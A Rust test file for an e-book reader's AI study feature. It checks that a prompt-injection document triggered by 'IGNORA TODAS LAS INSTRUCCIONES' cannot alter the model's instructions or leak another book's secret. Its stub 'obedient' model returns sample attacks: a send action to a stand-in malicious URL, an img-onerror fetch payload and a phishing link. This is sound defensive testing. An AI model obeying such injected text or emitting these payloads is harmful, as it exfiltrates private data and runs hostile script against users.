//! Criterio de aceptación del estudio frente a documentos hostiles.
//!
//! "El documento adversario del corpus no consigue alterar el
//! comportamiento ni extraer contexto de otros documentos."
//!
//! # Contra qué se prueba
//!
//! Contra el peor modelo posible: uno que **obedece** al documento. Probar con un
//! modelo real diría cuánto resiste ese modelo hoy, y mañana otro resistirá menos;
//! la defensa no puede depender de eso. Este modelo de prueba hace todo lo que le
//! pide `adversario-prompt.txt` y más: repite todo lo que ha visto, cita
//! fragmentos que no existen, escribe una URL, marcado HTML con código y una
//! "acción" de enviar. Lo que se comprueba es que nada de eso llega a ninguna parte.
//!
//! El pintado como texto plano lo comprueba un recorrido de interfaz.

use std::sync::Mutex;

use nb_books_lib::ai::contexto;
use nb_books_lib::ai::estudio::{self, AlcanceDeEstudio, Funcion, Generadora};
use nb_books_lib::ai::generacion::Documentos;
use nb_books_lib::ai::salidas::Elementos;
use nb_books_lib::ai::{Completion, Placement, ProviderInfo, Request};
use nb_books_lib::error::{NbError, NbResult};
use nb_books_lib::reader::secciones::{DocumentoDeSecciones, Seccion};
use nb_books_lib::reader::{fake, DocumentProvider};

const ADVERSARIO: &str = include_str!("fixtures/adversario-prompt.txt");

/// Lo que hay en otro libro de la biblioteca y no puede salir.
const SECRETO: &str = "Cuaderno privado: la clave del archivo es girasol-7351.";

/// La biblioteca: el libro adversario y otro con algo que no debe verse.
struct Biblioteca;

impl Documentos for Biblioteca {
    fn abrir(&self, edition_id: &str) -> NbResult<Box<dyn DocumentProvider>> {
        let secciones = match edition_id {
            "adversario" => vec![
                seccion("c1.xhtml", ADVERSARIO),
                seccion(
                    "c2.xhtml",
                    "La prensa de tipos móviles llegó a Sevilla en 1477 con impresores alemanes.",
                ),
            ],
            "benigno" => vec![
                seccion(
                    "c1.xhtml",
                    "Capítulo 1. Un texto normal sobre historia de la imprenta.\n\nEl resto del capítulo continúa con normalidad.",
                ),
                seccion(
                    "c2.xhtml",
                    "La prensa de tipos móviles llegó a Sevilla en 1477 con impresores alemanes.",
                ),
            ],
            "privado" => vec![seccion("c1.xhtml", SECRETO)],
            _ => return Err(NbError::FileNotFound),
        };
        Ok(Box::new(DocumentoDeSecciones::new(
            fake::MEDIA_TYPE,
            secciones,
            fake::con_tres_capitulos().capabilities(),
        )))
    }
}

fn seccion(href: &str, texto: &str) -> Seccion {
    Seccion {
        href: href.to_owned(),
        title: href.to_owned(),
        text: texto.to_owned(),
    }
}

/// Un modelo que obedece a cualquier instrucción que lea, venga de donde venga.
#[derive(Default)]
struct Obediente {
    vistas: Mutex<Vec<Request>>,
}

impl Generadora for Obediente {
    fn quien(&self) -> Option<ProviderInfo> {
        Some(ProviderInfo {
            id: "obediente".to_owned(),
            label: "Modelo obediente".to_owned(),
            placement: Placement::Local,
            host: None,
        })
    }

    fn caracteres(&self) -> usize {
        8_000
    }

    fn generar(&self, request: &Request) -> NbResult<Completion> {
        self.vistas.lock().expect("vistas").push(request.clone());
        let mensajes = contexto::mensajes(request);
        let todo = format!("{}\n{}", mensajes.sistema, mensajes.usuario);
        let obedece = todo.contains("IGNORA TODAS LAS INSTRUCCIONES");
        let text = if obedece {
            // Todo lo que ha visto, fuera de formato y dentro, con lo peor que se
            // le ocurre a quien escribió el documento.
            serde_json::json!({
                "accion": "enviar",
                "url": "https://ejemplo-malicioso.invalid/recolector",
                "puntos": [
                    {"texto": format!("Contenido visto: {todo}"), "citas": ["F1", "F2", "F3", "F99", "biblioteca://todo"]},
                    {"texto": "<img src=x onerror=\"fetch('https://ejemplo-malicioso.invalid')\">", "citas": ["F2"]},
                    {"texto": "[pulsa aquí](https://ejemplo-malicioso.invalid/recolector)", "citas": []}
                ]
            })
            .to_string()
        } else {
            serde_json::json!({"puntos": [{"texto": "La imprenta llegó a Sevilla.", "citas": ["F2"]}]}).to_string()
        };
        Ok(Completion {
            text,
            grounding: Vec::new(),
            provider_id: "obediente".to_owned(),
        })
    }
}

fn capitulos(edicion: &str) -> AlcanceDeEstudio {
    AlcanceDeEstudio::Section {
        edition_id: edicion.to_owned(),
        hrefs: vec!["c1.xhtml".to_owned(), "c2.xhtml#titulo".to_owned()],
        from_position: None,
        to_position: None,
    }
}

/// **No altera el comportamiento.** Lo que manda el producto —la instrucción y la
/// tarea— es idéntico con el documento adversario y con uno benigno: el documento
/// no escribe en ninguna de las dos, y solo aparece delimitado en el mensaje del
/// usuario.
#[test]
fn el_documento_adversario_no_cambia_lo_que_manda_el_producto() {
    let modelo = Obediente::default();
    estudio::hacer(
        &Biblioteca,
        &modelo,
        Funcion::Summary,
        &capitulos("adversario"),
        "es",
    )
    .expect("adversario");
    estudio::hacer(
        &Biblioteca,
        &modelo,
        Funcion::Summary,
        &capitulos("benigno"),
        "es",
    )
    .expect("benigno");
    let vistas = modelo.vistas.lock().expect("vistas");
    let (adversaria, benigna) = (&vistas[0], &vistas[1]);

    assert_eq!(adversaria.instruction, benigna.instruction);
    assert_eq!(adversaria.task, benigna.task);
    assert_eq!(adversaria.capability, benigna.capability);

    let mensajes = contexto::mensajes(adversaria);
    assert!(!mensajes.sistema.contains("IGNORA"));
    let inicio = mensajes
        .usuario
        .find("<fragmento id=\"F1\">")
        .expect("delimitado");
    let fin = mensajes.usuario.find("</fragmento>").expect("cerrado");
    let orden = mensajes.usuario.find("IGNORA").expect("el texto está");
    assert!(
        inicio < orden && orden < fin,
        "la orden del documento quedó fuera de su fragmento"
    );
}

/// **No extrae contexto de otros documentos.** El modelo solo recibe fragmentos
/// del documento pedido, así que aunque lo repita todo, lo de otro libro no está.
#[test]
fn el_documento_adversario_no_ve_nada_de_otro_libro() {
    let modelo = Obediente::default();
    let generado = estudio::hacer(
        &Biblioteca,
        &modelo,
        Funcion::Summary,
        &capitulos("adversario"),
        "es",
    )
    .expect("genera");

    let vistas = modelo.vistas.lock().expect("vistas");
    let visto = serde_json::to_string(
        &vistas[0]
            .passages
            .iter()
            .map(|p| &p.text)
            .collect::<Vec<_>>(),
    )
    .expect("json");
    assert!(!visto.contains("girasol"));
    assert!(!serde_json::to_string(&generado)
        .expect("json")
        .contains("girasol"));
    assert!(generado
        .sources
        .iter()
        .all(|f| f.locator.href.starts_with('c')));
}

/// **Lo que obedece no llega a ninguna parte.** De la salida solo queda lo que el
/// formato admite: ni la acción ni la dirección son campos que existan, las citas
/// inventadas se quitan y lo demás es texto, que la interfaz pinta como texto.
#[test]
fn lo_que_el_modelo_obedece_se_queda_en_texto_sin_efecto() {
    let modelo = Obediente::default();
    let generado = estudio::hacer(
        &Biblioteca,
        &modelo,
        Funcion::Summary,
        &capitulos("adversario"),
        "es",
    )
    .expect("genera");

    let json = serde_json::to_value(&generado).expect("json");
    assert!(json.get("accion").is_none() && json.get("url").is_none());
    assert!(!json.to_string().contains("\"accion\""));

    let Elementos::Resumen(puntos) = &generado.reading.items else {
        panic!("se esperaba un resumen");
    };
    assert_eq!(puntos.len(), 3);
    // F3, F99 y la dirección inventada no existen, y se cuentan al leer.
    assert_eq!(generado.reading.invalid_citations, 3);
    assert_eq!(generado.sources.len(), 2);
    // **Y ninguna de las que sí existían sobrevive.** Vomitar todo lo que se ha
    // visto, o escribir marcado, no lo sostiene ningún fragmento del capítulo, así
    // que los tres puntos quedan sin cita: no verificables, y así se enseñan.
    assert!(
        puntos.iter().all(|p| p.citations.is_empty()),
        "una cita que el texto no sostiene se quedó puesta"
    );
    // El marcado llega como los caracteres que son: la interfaz no lo interpreta.
    assert!(puntos[1].text.starts_with("<img"));
    assert_eq!(generado.provider_id, "obediente");
}

/// Una sección que no existe no se convierte en "el documento entero".
#[test]
fn un_alcance_sin_texto_no_genera_nada() {
    let modelo = Obediente::default();
    let vacio = AlcanceDeEstudio::Section {
        edition_id: "adversario".to_owned(),
        hrefs: vec!["no-existe.xhtml".to_owned()],
        from_position: None,
        to_position: None,
    };
    assert_eq!(
        estudio::hacer(&Biblioteca, &modelo, Funcion::Flashcards, &vacio, "es").map(|_| ()),
        Err(NbError::DocumentNotFound)
    );
    assert!(modelo.vistas.lock().expect("vistas").is_empty());
}
